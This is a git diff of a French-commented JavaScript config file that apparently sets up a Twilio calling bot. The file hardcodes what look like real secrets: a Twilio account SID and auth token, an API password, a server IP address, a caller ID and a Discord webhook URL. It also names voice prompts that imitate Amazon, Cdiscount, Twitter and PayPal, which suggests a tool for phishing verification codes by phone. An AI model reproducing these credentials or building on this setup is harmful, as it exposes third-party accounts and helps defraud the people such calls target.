@@ -1,14 +1,30 @@
 module.exports = {
+    /**
+     * Informations à propos du compte Twilio
+     */
     accountSid: 'ACe94d29e6379c3013b5495e2c129b75e9',
     authToken: 'f0e804b66bbf9acfbb72c5439ad1315d',
+    callerid: '+14793482767',
+
+    /**
+     * Informations à propos de l'API
+     */
     apipassword: '4ZMSTeSpX8FD9er9ymNKAHUms74fFjAf', 
     serverurl: 'http://176.169.193.232:1337', 
-    callerid: '+14793482767',
     
+    /**
+     * Informations à propos du webhook discord
+     */
     discordwebhook: 'https://discord.com/api/webhooks/792590400811958314/zEZAThBDQu1CIdiR5TkyUTutmWKPIPta6GWDoeUmp3JApyZmnVDamsRtCAnxGqW3sTfZ',
 
+    /**
+     * Port sur lequel tourne le serveur express
+     */
     port: process.env.PORT || 1337, 
 
+    /**
+     * Chemins de stockage des fichiers audios
+     */
     amazonfilepath: './voice/fr/amazon/ask-amazon.mp3',
     cdiscountfilepath: './voice/fr/cdiscount/ask-cdiscount.mp3',
     twitterfilepath: './voice/fr/twitter/ask-twitter.mp3',
@@ -21,6 +37,8 @@ module.exports = {
     endfilepath: './voice/fr/done/call-done.mp3',
     defaultfilepath:'./voice/fr/default/ask-default.mp3',
 
-    // Services : sms
+    /**
+     * Contenu des sms selon les services demandés
+     */
     paypalsms: 'pp test 123'
 };
